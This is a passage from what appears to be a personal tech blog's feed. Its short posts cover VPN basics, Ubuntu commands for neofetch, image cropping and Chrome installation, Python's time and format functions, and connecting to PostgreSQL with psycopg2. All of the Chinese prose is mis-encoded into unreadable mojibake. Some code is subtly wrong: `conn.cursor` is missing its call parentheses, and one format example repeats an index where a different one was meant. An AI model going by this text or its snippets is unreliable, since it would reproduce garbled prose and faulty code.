    <content type="html"><![CDATA[<p><a href="www.120cctv.cn/1494.html">å‚è€ƒåšå®¢</a></p><h1 id="ä»€ä¹ˆæ˜¯-GFW"><a href="#ä»€ä¹ˆæ˜¯-GFW" class="headerlink" title="ä»€ä¹ˆæ˜¯ GFW"></a>ä»€ä¹ˆæ˜¯ GFW</h1><h2 id="GFW-æ˜¯-Great-Firewall-çš„ç®€ç§°ï¼Œå³ä¸­å›½é˜²ç«å¢™ï¼Œä¼šå±è”½ä¸€äº›åŸŸåã€‚"><a href="#GFW-æ˜¯-Great-Firewall-çš„ç®€ç§°ï¼Œå³ä¸­å›½é˜²ç«å¢™ï¼Œä¼šå±è”½ä¸€äº›åŸŸåã€‚" class="headerlink" title="GFW æ˜¯ Great Firewall çš„ç®€ç§°ï¼Œå³ä¸­å›½é˜²ç«å¢™ï¼Œä¼šå±è”½ä¸€äº›åŸŸåã€‚"></a>GFW æ˜¯ Great Firewall çš„ç®€ç§°ï¼Œå³ä¸­å›½é˜²ç«å¢™ï¼Œä¼šå±è”½ä¸€äº›åŸŸåã€‚</h2><p><a href="https://b23.tv/NCShBzN">å‚è€ƒ</a></p><h1 id="VPN-æ¦‚å¿µï¼ŒæŠ€æœ¯åŸç†å’Œè¯¯åŒº"><a href="#VPN-æ¦‚å¿µï¼ŒæŠ€æœ¯åŸç†å’Œè¯¯åŒº" class="headerlink" title="VPN æ¦‚å¿µï¼ŒæŠ€æœ¯åŸç†å’Œè¯¯åŒº"></a>VPN æ¦‚å¿µï¼ŒæŠ€æœ¯åŸç†å’Œè¯¯åŒº</h1><p>HTTP åè®®æ¯”è¾ƒå¤§çš„ç¼ºç‚¹å°±æ˜¯æ˜æ–‡ï¼Œå…¶å¹¶æ²¡æœ‰å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†.</p><p>VPN æ˜¯ Virtual Private Network, è™šæ‹Ÿä¸“ç”¨ç½‘ç»œ.</p><p>å…¬å¸æ‰€è¦å‘é€çš„æ•°æ®éƒ½è¦ç»è¿‡ VPN é›†çº¿å™¨åŠ å¯†.</p><p>VPN æœ‰å¾ˆå¤šç±»å‹:</p><h2 id="VPN-ç±»å‹"><a href="#VPN-ç±»å‹" class="headerlink" title="VPN ç±»å‹"></a>VPN ç±»å‹</h2><h3 id="ç«™ç‚¹-â€“-ç«™ç‚¹"><a href="#ç«™ç‚¹-â€“-ç«™ç‚¹" class="headerlink" title="ç«™ç‚¹ â€“ ç«™ç‚¹"></a>ç«™ç‚¹ â€“ ç«™ç‚¹</h3><p>å¤šç”¨åœ¨åŒä¸€ä¸ªå…¬å¸ï¼Œä½†ä¸åŒåœ°ç‚¹çš„å†…éƒ¨ç½‘. ä¹Ÿå¯ä»¥ç”¨åœ¨ä¸åŒå…¬å¸çš„å¤–éƒ¨ç½‘.</p><p>ç«™ç‚¹å¯¹ç«™ç‚¹æ„å‘³ç€ä¸¤ç«¯æˆ–è€…å¤šç«¯çš„åœ°ç‚¹ç›¸å¯¹å›ºå®šã€‚</p><p>è¿™æ—¶ï¼Œæ•°æ®åŒ…ä¸Šçš„æºåœ°å€ä¼šè¢«æ›´æ”¹ä¸ºå½“å‰ VPN é›†çº¿å™¨çš„åœ°å€ï¼Œç›®æ ‡åœ°å€ä¼šè¢«æ›´æ”¹ä¸ºç›®çš„ VPN é›†çº¿å™¨çš„åœ°å€. è¿™æ ·å°±éšè—äº†å®é™…åŸåœ°å€å’Œå®é™…ç›®æ ‡åœ°å€.</p><h3 id="å®¢æˆ·ç«¯-â€“-ç«™ç‚¹"><a href="#å®¢æˆ·ç«¯-â€“-ç«™ç‚¹" class="headerlink" title="å®¢æˆ·ç«¯ â€“ ç«™ç‚¹"></a>å®¢æˆ·ç«¯ â€“ ç«™ç‚¹</h3><p>å®¢æˆ·ç«¯ â€“ ç«™ç‚¹ VPNï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºè¿œç¨‹ç™»å½• VPN, å…¶é€‚åˆå±…å®¶åŠå…¬çš„æƒ…æ™¯.</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ç§ç±»å‹çš„ VPN å¯ä»¥ç”¨æµè§ˆå™¨ç›´æ¥é€šä¿¡. ä¹Ÿå¯ä»¥å¦å¤–å®‰è£…å®¢æˆ·ç«¯è½¯ä»¶æ¥è¿›è¡Œ VPN é€šä¿¡.</p><p>è¿™ç§ç±»å‹ä¹Ÿåˆ†ä¸º:</p><ul><li>å…¨éš§é“, å³æ‰€æœ‰çš„ç½‘ç»œæ•°æ®éƒ½èµ°å…¬å¸ç½‘</li><li>åŠéš§é“</li></ul><h2 id="VPN-èŒè´£"><a href="#VPN-èŒè´£" class="headerlink" title="VPN èŒè´£"></a>VPN èŒè´£</h2><h3 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h3><p>å¸¸ç”¨ç®—æ³•ä¸º AES å’Œ 3DES, è¿™é‡Œçš„ E ä»£è¡¨ Encryption.</p><h3 id="ä¿æŠ¤æ•°æ®å®Œæ•´æ€§"><a href="#ä¿æŠ¤æ•°æ®å®Œæ•´æ€§" class="headerlink" title="ä¿æŠ¤æ•°æ®å®Œæ•´æ€§"></a>ä¿æŠ¤æ•°æ®å®Œæ•´æ€§</h3><p>ä½¿ç”¨ Hash, ä½¿ç”¨ç®—æ³•æ ¹æ®å­—ç¬¦ä¸²ç”Ÿæˆå”¯ä¸€çš„ Hash å€¼.</p><p>å¸¸ç”¨ç®—æ³•ä¸º MD5 å’Œ SHA.</p><h3 id="è®¤è¯"><a href="#è®¤è¯" class="headerlink" title="è®¤è¯"></a>è®¤è¯</h3><p>å¸¸è§ä½¿ç”¨çš„ç®—æ³•æœ‰ PSK å’Œ RSA.</p><h2 id="VPN-çš„æ¡†æ¶"><a href="#VPN-çš„æ¡†æ¶" class="headerlink" title="VPN çš„æ¡†æ¶"></a>VPN çš„æ¡†æ¶</h2><p>ä¸»è¦è¿ç”¨äº†ä¸¤ä¸ªåè®®:</p><ul><li>IPsec, IP Security, ä½äºç½‘ç»œå±‚ï¼Œå…¶æ—¢å¯ä»¥ç”¨åœ¨ â€œå®¢æˆ·ç«¯ â€“ ç«™ç‚¹â€ VPN, ä¹Ÿå¯ä»¥ç”¨åœ¨ â€œç«™ç‚¹ â€“ ç«™ç‚¹â€ VPN</li><li>SSL&#x2F;TLS, ä½äºè¡¨ç¤ºå±‚,  è¿™é‡Œä½äºåé¢çš„ S éƒ½æ˜¯ Security çš„å«ä¹‰</li></ul>]]></content>
    
    
    <categories>
      
      <category>CNSS</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CNSS å¤ä»¤è¥ç½‘ç«™ä¹ é¢˜æ€»ç»“</title>
    <link href="/2022/08/28/CNSS-%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%BD%91%E7%AB%99%E4%B9%A0%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <url>/2022/08/28/CNSS-%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%BD%91%E7%AB%99%E4%B9%A0%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="è¿è¡Œ-Neofetch"><a href="#è¿è¡Œ-Neofetch" class="headerlink" title="è¿è¡Œ Neofetch"></a>è¿è¡Œ Neofetch</h1><p>Neofetch ç”¨äºæ¼‚äº®çš„æ˜¾ç¤ºç³»ç»Ÿ logo å’Œä¸€äº›ç³»ç»Ÿä¿¡æ¯.</p><p>å®‰è£… Neofetch:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt -yqq <span class="hljs-keyword">install</span> neofetch<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CNSS</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu ä¸‹å¤„ç†å›¾ç‰‡</title>
    <link href="/2022/08/28/Ubuntu-%E4%B8%8B%E5%A4%84%E7%90%86%E5%9B%BE%E7%89%87/"/>
    <url>/2022/08/28/Ubuntu-%E4%B8%8B%E5%A4%84%E7%90%86%E5%9B%BE%E7%89%87/</url>
    
    <content type="html"><![CDATA[<p>éœ€è¦ç”¨åˆ° <code>file</code> å‘½ä»¤å’Œ <code>convert</code> å‘½ä»¤ï¼Œè‹¥æ²¡æœ‰ <code>convert</code> å‘½ä»¤:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> graphicsmagick-imagemagick-compat<br></code></pre></td></tr></table></figure><h1 id="ä½¿ç”¨-file-å‘½ä»¤"><a href="#ä½¿ç”¨-file-å‘½ä»¤" class="headerlink" title="ä½¿ç”¨ file å‘½ä»¤"></a>ä½¿ç”¨ <code>file</code> å‘½ä»¤</h1><p>å…¶ä½œç”¨ä¸ºæŸ¥çœ‹å›¾ç‰‡å‚æ•°:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> <span class="hljs-keyword">file</span> helloc.png<br></code></pre></td></tr></table></figure><p>ç»“æœä¸º:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">helloc</span>.png: PNG image data, <span class="hljs-number">976</span> x <span class="hljs-number">1064</span>, <span class="hljs-number">8</span>-bit/color RGBA, non-interlaced<br></code></pre></td></tr></table></figure><h1 id="ä½¿ç”¨-convert-å‘½ä»¤"><a href="#ä½¿ç”¨-convert-å‘½ä»¤" class="headerlink" title="ä½¿ç”¨ convert å‘½ä»¤"></a>ä½¿ç”¨ <code>convert</code> å‘½ä»¤</h1><p>ä½¿ç”¨ <code>-crop</code> å‚æ•°çš„æ ¼å¼ä¸º:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>convert <span class="hljs-variable">$&#123;</span>SOURCE_IMG&#125; -crop <span class="hljs-variable">$&#123;</span>HIGHT&#125;x<span class="hljs-variable">$&#123;</span>WIDTH&#125;+<span class="hljs-variable">$&#123;</span>LEFT_TOP_X&#125;+<span class="hljs-variable">$&#123;</span>LEFT_TOP_Y&#125; <span class="hljs-variable">$&#123;</span>TARGET_IMG&#125;<br></code></pre></td></tr></table></figure><p>å‰é¢çš„ <code>$&#123;HIGHT&#125;x$&#123;WIDTH&#125;</code> ä¸ºç›®æ ‡çš„å¤§å°ï¼Œ<code>$&#123;LEFT_TOP_X&#125;</code> ä¸ºå¼€å§‹è£å‰ªçš„å®½åº¦ï¼Œ<code>$&#123;LEFT_TOP_Y&#125;</code> ä¸ºå¼€å§‹è£å‰ªçš„é«˜åº¦ã€‚ä¹Ÿå°±æ˜¯ä»å·¦ä¸Šè§’å¼€å§‹æ•°çš„ä½ç½®.</p>]]></content>
    
    
    <categories>
      
      <category>Ubuntu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python ä¸­ time åº“</title>
    <link href="/2022/08/27/Python-%E4%B8%AD-time-%E5%BA%93/"/>
    <url>/2022/08/27/Python-%E4%B8%AD-time-%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<p>time åº“æ˜¯ Python ä¸­å¤„ç†æ—¶é—´çš„æ ‡å‡†åº“ã€‚</p><h1 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h1><ul><li>è·å–ç³»ç»Ÿæ—¶é—´ï¼Œå¹¶æ ¼å¼åŒ–è¾“å‡º</li><li>è®¡æ—¶ï¼Œæ–¹ä¾¿åˆ†æç¨‹åºçš„æ€§èƒ½</li></ul><h1 id="time-å‡½æ•°"><a href="#time-å‡½æ•°" class="headerlink" title="time() å‡½æ•°"></a>time() å‡½æ•°</h1><p>ç”¨äºè·å–ä»1970å¹´1æœˆ1æ—¥00ï¼š00ï¼š00å¼€å§‹ï¼Œåˆ°ç°åœ¨çš„æ€»ç§’æ•°ï¼Œä¹Ÿè¢«ç§°ä¸ºè®¡ç®—æœºå†…éƒ¨æ—¶é—´.</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dos">import <span class="hljs-built_in">time</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>())<br></code></pre></td></tr></table></figure><h1 id="localtime-å‡½æ•°å’Œ-gmtime-å‡½æ•°"><a href="#localtime-å‡½æ•°å’Œ-gmtime-å‡½æ•°" class="headerlink" title="localtime() å‡½æ•°å’Œ gmtime() å‡½æ•°"></a>localtime() å‡½æ•°å’Œ gmtime() å‡½æ•°</h1><p>éƒ½å¯è¿”å›ä»¥å…ƒç»„è¡¨ç¤ºçš„æ—¶é—´å¯¹è±¡.</p><p>localtime() è¿”å›å½“åœ°æ—¶é—´ã€‚</p><p>gmtime() è¿”å›ä¸–ç•Œç»Ÿä¸€æ—¶é—´ã€‚</p><p>ä¸¤è€…çš„é»˜è®¤å‚æ•°ä¸º <code>time.time()</code> çš„è¿”å›å€¼. æ¥å—ä¸€ä¸ªæµ®ç‚¹æ•°ï¼Œè¡¨ç¤ºç§’ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import <span class="hljs-selector-tag">time</span><br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(time.localtime()</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(time.gmtime()</span></span>)<br></code></pre></td></tr></table></figure><h1 id="ctime-å‡½æ•°"><a href="#ctime-å‡½æ•°" class="headerlink" title="ctime() å‡½æ•°"></a>ctime() å‡½æ•°</h1><p>å…¶ä¼šè¯»å–å½“å‰æ—¶é—´å¹¶ä»¥æ˜“è¯»çš„æ ¼å¼è¡¨ç¤ºï¼Œè¿”å›å­—ç¬¦ä¸², é»˜è®¤å‚æ•°ä¸º <code>time.time()</code> çš„è¿”å›å€¼:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import <span class="hljs-selector-tag">time</span><br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(time.ctime()</span></span>)<br></code></pre></td></tr></table></figure><h1 id="strftime-å‡½æ•°"><a href="#strftime-å‡½æ•°" class="headerlink" title="strftime() å‡½æ•°"></a>strftime() å‡½æ•°</h1><p>ä»¥å­—ç¬¦ä¸²å½¢å¼æ ¼å¼åŒ–è¾“å‡ºæ—¶é—´, æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œå‰è€…ä¸ºæ ¼å¼ï¼Œåè€…ä¸ºæ—¶é—´å¯¹è±¡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">import <span class="hljs-keyword">time</span> <br><br>t = time.localtime()<br><span class="hljs-keyword">print</span>(time.strftime(<span class="hljs-string">&quot;%Y-%m-%d %H: %M: %S&quot;</span>, t))<br></code></pre></td></tr></table></figure><p>å…¶æ ¼å¼æœ‰:</p><ul><li><code>%Y</code></li><li><code>%m</code></li><li><code>%d</code></li><li><code>%B</code>, å®Œæ•´æœˆä»½å</li><li><code>%b</code>, ç®€åŒ–</li><li><code>%A</code>, å®Œæ•´æ˜ŸæœŸå</li><li><code>%a</code>, ç®€åŒ–</li><li><code>%H</code></li><li><code>%I</code>, 12 å°æ—¶åˆ¶</li><li><code>%p</code>, ä¸Šä¸‹åˆ</li><li><code>%M</code></li><li><code>%S</code></li></ul><h1 id="perf-counter"><a href="#perf-counter" class="headerlink" title="perf_counter()"></a>perf_counter()</h1><p>è®°å½• CPU è¿è¡Œæ—¶é—´ï¼Œè¿”å›å€¼ä»¥ç§’ä¸ºå•ä½.</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> <span class="hljs-type">time</span><br><br>start = <span class="hljs-type">time</span>.perf_counter()<br>end = <span class="hljs-type">time</span>.perf_counter()<br>print(<span class="hljs-keyword">start</span>)<br>print(<span class="hljs-keyword">end</span>)<br>print(<span class="hljs-keyword">end</span>-<span class="hljs-keyword">start</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python ä¸­ format å‡½æ•°ç”¨æ³•</title>
    <link href="/2022/08/27/Python-%E4%B8%AD-format-%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95/"/>
    <url>/2022/08/27/Python-%E4%B8%AD-format-%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="é€šè¿‡-index-å³ä½ç½®"><a href="#é€šè¿‡-index-å³ä½ç½®" class="headerlink" title="é€šè¿‡ index å³ä½ç½®"></a>é€šè¿‡ index å³ä½ç½®</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;This is a &#123;0&#125; about &#123;1&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;example&#x27;</span>, <span class="hljs-string">&#x27;format&#x27;</span>))<br>This <span class="hljs-keyword">is</span> a example about <span class="hljs-built_in">format</span><br></code></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªä¾‹å­:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&gt;&gt;&gt; print(<span class="hljs-string">&#x27;&#123;0&#125; two three three two &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;one&#x27;</span>))<br><span class="hljs-literal">one</span> <span class="hljs-literal">two</span> <span class="hljs-literal">three</span> <span class="hljs-literal">three</span> <span class="hljs-literal">two</span> <span class="hljs-literal">one</span><br></code></pre></td></tr></table></figure><p>è‹¥ä¸è¾“å…¥æ•°å­—ï¼Œåˆ™æŒ‰é¡ºåºå¡«å……ã€‚</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&gt;&gt;&gt; print(<span class="hljs-string">&#x27;&#123;&#125; two three three two &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;one&#x27;</span>, <span class="hljs-string">&#x27;one&#x27;</span>))<br><span class="hljs-literal">one</span> <span class="hljs-literal">two</span> <span class="hljs-literal">three</span> <span class="hljs-literal">three</span> <span class="hljs-literal">two</span> <span class="hljs-literal">one</span><br></code></pre></td></tr></table></figure><h1 id="é€šè¿‡-keys-å…³é”®è¯"><a href="#é€šè¿‡-keys-å…³é”®è¯" class="headerlink" title="é€šè¿‡ keys å…³é”®è¯"></a>é€šè¿‡ keys å…³é”®è¯</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&gt;&gt;&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;My name is &#123;name&#125;, a &#123;identity&#125;&#x27;</span>.format(<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;Jie&#x27;</span>, <span class="hljs-attribute">identity</span>=<span class="hljs-string">&#x27;student&#x27;</span>))<br></code></pre></td></tr></table></figure><h1 id="é€šè¿‡ä¸‹æ ‡"><a href="#é€šè¿‡ä¸‹æ ‡" class="headerlink" title="é€šè¿‡ä¸‹æ ‡"></a>é€šè¿‡ä¸‹æ ‡</h1><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">data = [<span class="hljs-string">&#x27;Jie&#x27;</span>, <span class="hljs-string">&#x27;student&#x27;</span>]</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;My name is &#123;0[0]&#125;, a &#123;0[0]&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(data))</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu å®‰è£… Google æµè§ˆå™¨</title>
    <link href="/2022/08/27/Ubuntu-%E5%AE%89%E8%A3%85-Google-%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    <url>/2022/08/27/Ubuntu-%E5%AE%89%E8%A3%85-Google-%E6%B5%8F%E8%A7%88%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>é€šè¿‡æºä»£ç å®‰è£…ï¼Œè¿›å…¥ <code>https://www.google.cn/chrome/</code> ä¸‹è½½ <code>.deb</code> åŒ….</p><p>ç„¶å:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> ~<span class="hljs-string">/Downloads</span><br>sudo dpkg -i google-chrome-stable_current_amd64.deb<br></code></pre></td></tr></table></figure><p>ä»å‘½ä»¤è¡Œæ‰“å¼€ Google æµè§ˆå™¨:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">google-chrome</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Ubuntu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å®‰è£… Python åº“ psycopg2 æŠ¥é”™</title>
    <link href="/2022/08/27/%E5%AE%89%E8%A3%85-Python-%E5%BA%93-psycopg2-%E6%8A%A5%E9%94%99/"/>
    <url>/2022/08/27/%E5%AE%89%E8%A3%85-Python-%E5%BA%93-psycopg2-%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>æŠ¥é”™å†…å®¹ä¸º:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts">.<span class="hljs-keyword">/psycopg/</span>psycopg.h:<span class="hljs-number">36</span>:<span class="hljs-number">10</span>: fatal error: libpq-fe.h: No such file or directory<br>         <span class="hljs-number">36</span> | <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;libpq-fe.h&gt;</span></span><br>            |          ^~~~~~~~~~~~<br>      compilation terminated.<br></code></pre></td></tr></table></figure><p>å› æ­¤å®‰è£…ä¾èµ–:</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">sudo apt-<span class="hljs-built_in">get</span> install libpq-<span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure><p>ç„¶åé‡æ–°å®‰è£…:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> psycopg2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 3 è¿æ¥ PostgreSQL æ•°æ®åº“</title>
    <link href="/2022/08/27/Python-3-%E8%BF%9E%E6%8E%A5-PostgreSQL-%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <url>/2022/08/27/Python-3-%E8%BF%9E%E6%8E%A5-PostgreSQL-%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<p><a href="https://pypi.org/project/psycopg2/">ç›¸å…³æ–‡æ¡£</a><br>ä½¿ç”¨ psycopg2 åº“ã€‚</p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>Psycopg2 åœ¨ C ä¸­ä½œä¸º libpg åŒ…è£…å™¨å®ç°çš„ã€‚å…¶å…¼å®¹ Unicode å’Œ Python3.</p><h1 id="Basic-module-usage"><a href="#Basic-module-usage" class="headerlink" title="Basic module usage"></a>Basic module usage</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> psycopg2<br><br>conn = psycopg2.<span class="hljs-keyword">connect</span>(&quot;dbname=test user=postgres&quot;)<br>cur = conn.<span class="hljs-keyword">cursor</span><br>cur.<span class="hljs-keyword">execute</span>(&quot;CREATE TABLE test (id serial PRIMARY KEY, num integer, data varchar);&quot;)<br>cur.<span class="hljs-keyword">execute</span>(&quot;INSERT INTO test (num, data) VALUES (%s, %s)&quot;, (<span class="hljs-number">100</span>, &quot;abc&#x27;def&quot;))<br>cur.<span class="hljs-keyword">execute</span>(&quot;SELECT * FROM test;&quot;)<br>cur.fetchone()<br>conn.<span class="hljs-keyword">commit</span>()<br>cur.<span class="hljs-keyword">close</span>()<br>conn.<span class="hljs-keyword">close</span>()<br></code></pre></td></tr></table></figure><p><code>connect()</code> æ–¹æ³•èƒ½å¤Ÿåˆ›å»ºä¸€ä¸ª session, ç„¶åè¿”å›ä¸€ä¸ª connection instance.</p><p><code>connect()</code> æ–¹æ³•çš„å‚æ•°:</p><ul><li>dbname, æ•°æ®åº“åç§°</li><li>database, åŒæ ·æ˜¯æ•°æ®åº“åç§°</li><li>userï¼Œç”¨äºéªŒè¯çš„ç”¨æˆ·å</li><li>password, å¯†ç </li><li>host, ä¸»æœºåœ°å€</li><li>port, è¿æ¥çš„ç«¯å£å·</li></ul><p>ä½¿ç”¨ç±»ä¼¼äº <code>connect(host=&#39;localhost&#39;, database=&quot;test&quot;, user=&quot;postgres&quot;)</code></p><p><code>connection</code> æ˜¯ä¸€ä¸ªç±»ï¼Œå…¶ <code>cursor()</code> æ–¹æ³•åˆ›å»ºä¸€ä¸ª cursor instance, å…¶å¯ç”¨æ¥æ‰§è¡Œæ•°æ®åº“å‘½ä»¤å’ŒæŸ¥è¯¢ã€‚å¦‚ä½¿ç”¨ <code>execute()</code> æˆ– <code>executemany</code> æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤ï¼Œ ç”¨ <code>fetchmany()</code> æˆ– <code>fetchall()</code> æˆ– <code>fetchone()</code> æ–¹æ³•æ¥ retrieve data from databaseã€‚</p><p><code>commit()</code> å’Œ <code>rollback()</code> æ–¹æ³•ç”¨äºåœæ­¢ä¸€ä¸ª transactions.</p><h1 id="Passing-parameters-to-SQL-queries"><a href="#Passing-parameters-to-SQL-queries" class="headerlink" title="Passing parameters to SQL queries"></a>Passing parameters to SQL queries</h1><p>ä½¿ç”¨ <code>execute()</code> æ–¹æ³•ä¸ <code>%s</code>:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">cur.execute(<span class="hljs-string">&quot;&quot;&quot;</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-string">    INSERT INTO some_table (an_int, a_date, a_string)</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-string">    VALUES (%s, %s, %s);</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-string">    &quot;&quot;&quot;</span>,</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    (<span class="hljs-number">10</span>, datetime.date(<span class="hljs-number">2005</span>, <span class="hljs-number">11</span>, <span class="hljs-number">18</span>), <span class="hljs-string">&quot;O&#x27;Reilly&quot;</span>))</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ named arguments <code>%(name)s</code>, å…¶é¡ºåºå¯ä»¥å’Œ <code>VALUES</code> ä¸åŒï¼Œä¸”å¯è¢«é‡å¤ä½¿ç”¨:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">cur.execute(<span class="hljs-string">&quot;&quot;&quot;</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-string">    INSERT INTO 